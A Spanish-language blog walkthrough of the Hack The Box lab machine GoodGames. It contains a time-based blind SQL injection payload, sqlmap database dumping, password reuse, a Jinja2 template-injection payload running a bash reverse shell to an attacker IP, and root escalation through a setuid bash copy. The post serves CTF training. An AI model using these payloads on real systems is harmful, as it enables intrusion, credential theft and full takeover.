---
title:  "Writeup de la máquina GoodGames de Hack The Box"
date: 2023-06-23
mathjax: true
layout: post
categories: writeup
tags: docker sql-injection nmap port-forwarding sqlmap ssti python flask
---

# Resolución de la máquina GoodGames de la plataforma de HackTheBox

![](https://i.ibb.co/yqd7tfJ/homepage.png)

### 🎮 *"¡Hacking is the BEST GAME!"*

**Primeramente hacemos un escaneo de la máquina en búsqueda de puertos abiertos con Nmap:**

```bash
sudo nmap 10.10.11.130 -p- --open --min-rate 5000 -sS -Pn -oG openPorts -vvv 
```

Con el comando anterior exportamos el resultado en un formato en el cual podamos extraer los puertos abiertos con la siguente secuencia de comandos:

```bash
cat openPorts | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ','
```

#### *Hora de realizar el escaneo...*

```bash
sudo nmap 10.10.11.130 -p 80 -sVC -sS -Pn -oN scanNormal -vvv
```

#### Explicación del uso de Nmap:

```bash
-p 80 # Especificamos el puerto 80.
-sVC # También '-sV -sC', ejecuta scripts básicos de Nmap y a la vez intenta detectar los servicios de cada puerto.
-sS # Permite escanear velózmente y de forma discreta.
-Pn # No realiza un ping, en vez de eso omite el descubrimiento del host. (En algunos casos es útil para hacer un bypass de alguna capa de firewall o cualquier cosa que bloquee la conexión).
-oN # Exporta el resultado (output) en un formato normal y legible.
-vvv # Para visualizar con mayor detalle lo que sucede durante el escaneo (verbose).
```

#### Con el escaneo completo obtenemos el siguiente resultado:

![](https://i.ibb.co/6FsCvWq/scan-Normal.png)


#### Vemos el dominio "goodgames.htb", por lo que lo agregamos a nuestro archivo /etc/hosts y procedemos a visitar el sitio.

```
10.10.11.130    goodgames.htb
```

#### Luego de visitar la página encontramos una sección para autenticarnos con "Email" y "Password":

![](https://i.ibb.co/G5n12gT/homepage.png)

#### En base a esto, procedemos a probar si el inicio de sesión es vulnerable a SQL Injection:

Primero capturamos la solicitud (Request) con **Burp Suite** y la guardamos con el nombre "req.txt"

![](https://i.ibb.co/jgM4HPB/req-burpsuite.png)

### SQL Injection - SQLmap

#### Una vez tenemos el archivo *req.txt* con la solicitud interceptada con Burp Suite, procedemos automatizar un ataque de SQL Injection con SQLmap:

Con el siguiente comando le indicamos a la herramienta SQLmap que utilize el Request del archivo "req.txt" (-r req.txt) y que intente enumerar las bases de datos (--dbs).
También le indicamos que durante el ataque no nos pregunte cómo ir procediendo (--batch).

```bash
sqlmap -r req.txt --batch --dbs
```

#### Tenemos suerte, y SQLmap logra encontrar vulnerable el parámetro "email" con una vulnerabilidad a ciegas (Blind) y basada en tiempo (time-based):

```
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=admin@goodgames.htb' AND (SELECT 7407 FROM (SELECT(SLEEP(5)))TmZm) AND 'GEGY'='GEGY&password=password
---
```

#### Finalmente logra encontrar dos bases de datos ("information_schema" y "main"):

```
available databases [2]:
[*] information_schema
[*] main
```

#### Procedemos a investigar qué tablas tiene la base de datos "main":

```bash
sqlmap -r req.txt --batch --dbs -D main --dump
```

#### Tablas:

- blog
- blog_comments
- user

```
[16:16:10] [INFO] fetching tables for database: 'main'
[16:16:10] [INFO] fetching number of tables for database 'main'
[16:16:10] [INFO] resumed: 3
[16:16:10] [INFO] resumed: blog
[16:16:10] [INFO] resumed: blog_comments
[16:16:10] [INFO] resumed: user
```

#### Ahora solo queda terminar extraer la información de la tabla "user" de la base de datos "main".

```bash
sqlmap -r req.txt -D main -T user --dump --batch
```

#### Al intentar crackear los hashes con el diccionario de SQLmap no logramos obtener la contraseña, por lo que quitamos el parámetro "--batch" y le especificamos que vamos a utilizar nuestro diccionario "rockyou.txt".

### Iniciamos sesión con las siguientes credenciales obtenidas con SQLmap:

```yaml
- email: admin@goodgames.htb
- password: superadministrator
```

#### Una vez en el directorio goodgames.htb/profile vemos en la parte superior un botón que nos lleva a los ajustes aparentemente en la siguiente URL: 

```
http://internal-administration.goodgames.htb/
```

*Para poder acceder a ese subdominio, lo agregamos al archivo /etc/hosts*

```
----------
/etc/hosts
----------
10.10.11.130    goodgames.htb internal-administration.goodgames.htb
```

#### Una vez ingresado al subdominio, nos encontramos con un panel de login:

![](https://i.ibb.co/G2jm89p/login-flask.png)

#### Al intentar utilizar la misma contraseña ("superadministrator") con el nombre de usuario "admin", logramos autenticarnos y accedemos al dashboard. *Esto es una falla de seguridad común, por eso está la importancia de siempre usar contraseñas distintas para cada lugar.*

### Server-Side Template Injection (SSTI)

#### Dentro del apartado de Settings, podemos ver que podemos cambiar nuestro nombre, y si analizamos las tecnologías que utiliza la aplicación web, está ejecutando Flask (Python). Por lo que podríamos intentar inyectarle el payload básico de Server-Side Template Injection:

{% raw %}
```python
{{7*7}}
```
{% endraw %}

![](https://i.ibb.co/jgkzY1Y/ssti-49.png)

#### Ahora que sabemos que es vulnerable a Server-Side Template Injection podemos intentar ejecutar del lado del Servidor (Server-Side) una shell reversa hacia nuestra máquina atacante. 

##### Sabemos que la app web utiliza Python para el Back-End por lo que podemos revisar el sitio de PayloadAllTheThings y buscar un payload para ejecutar una reverse shell en Python.

##### En un principio podríamos construir entonces nuestro propio payload de la siguiente manera:

{% raw %}
```python
{{cycler.__init__.__globals__.os.popen('id').read()}}
```
{% endraw %}

#### Ahora modificamos la función os.popen('') para que ejecute una shell reversa con Netcat de la siguiete manera:

*Payload de Netcat:*

```bash
bash -c "bash -i >& /dev/tcp/10.10.14.20/4444 0>&1"
```

*Lo ingresamos dentro de la función os.popen()*

{% raw %}
```python
{{cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.20/4444 0>&1"').read()}}
```
{% endraw %}

#### Ahora solamente ponemos Netcat a la escucha por el puerto 4444 y ejecutamos el payload anterior dentro del campo vulnerable a SSTI (Server-Side Template Injection) como vimos anteriormente.


```bash
nc -lvp 4444
```

![](https://i.ibb.co/0mjcbnS/netcat.png)

##### Si miramos nuestra dirección IP del hostname, vemos que al parecer podríamos estar dentro de un contenedor de Docker. Adicionalmente estamos como usuario root dentro de este contenedor.

### Port Forwarding

#### Primero encontramos la flag de usuario en el directorio $HOME del usuario "augustus":

```bash
cd /home/augustus
cat user.txt
```

#### Ahora necesitamos movernos dentro del servidor y pasar fuera del contenedor hacia la máquina local. 

##### Como vimos antes, la contraseña ya se utilizó más de una vez y quizás fuera del contenedor. También puede que exista un usuario "augustus" en la máquina local, por lo que procedemos a intentar conectarnos por SSH desde nuestro host (172.19.0.2) hacia el host 172.19.0.1:

```bash
ssh augustus@172.19.0.1
augustus@172.19.0.1's password: superadministrator
```

![](https://i.ibb.co/Hpq30pf/ssh-augustus.png)

#### Al ejecutar "hostname -I" vemos que ya estamos dentro del host local por la dirección IP de la máquina (10.10.11.130):

```bash
augustus@GoodGames:~$ hostname -I
hostname -I
10.10.11.130 172.19.0.1 172.17.0.1 dead:beef::250:56ff:feb9:c5db 
augustus@GoodGames:~$
```

### Escalación de Privilegios

##### *Explicación*: Tenemos que tener en cuenta que dentro del contenedor somos usuario root, pero dentro del host local de la máquina somos usuarios sin privilegios. 

##### En base a esto hay algo muy simple que podemos hacer que es copiar el binario "bash" desde la máquina local hacia nuestro directorio $HOME y desde el contenedor como usuario root modificar los privilegios para luego usarlo y ejecutar "./bash -p" y escalar el privilegio a root desde el host local de la máquina.

#### Una vez planeado nuestro ataque:

- Nos conectamos por SSH:

```bash
ssh augustus@172.19.0.1
augustus@172.19.0.1's password: superadministrator
```

- Copiamos el binario /bin/bash hacia /home/augustus/bash

- Volvemos al contenedor y modificamos los permisos:

```bash
root@3a453ab39d3d:/home/augustus# chown root:root bash
chown root:root bash
root@3a453ab39d3d:/home/augustus# chmod 4755 bash
chmod 4755 bash
root@3a453ab39d3d:/home/augustus# ls
ls
bash  user.txt
root@3a453ab39d3d:/home/augustus# ls -l
ls -l
total 1212
-rwsr-xr-x 1 root root 1234376 Jun 24 00:52 bash
-rw-r----- 1 root 1000      33 Jun 23 17:52 user.txt
root@3a453ab39d3d:/home/augustus#
```

- Nuevamente por SSH nos conectamos al host local de la máquina con el usuario augustus y ejecutamos "./bash -p"

```bash
augustus@GoodGames:~$ ./bash -p
./bash -p
bash-5.1# whoami
whoami
root
bash-5.1#
```

### 🎉 Y Listo!!! 🎉

#### Obtenemos la flag de root en /root/root.txt y completamos la máquina con acceso total al sistema!!

Happy Hacking!!

----

## Author: Mateo Fumis 
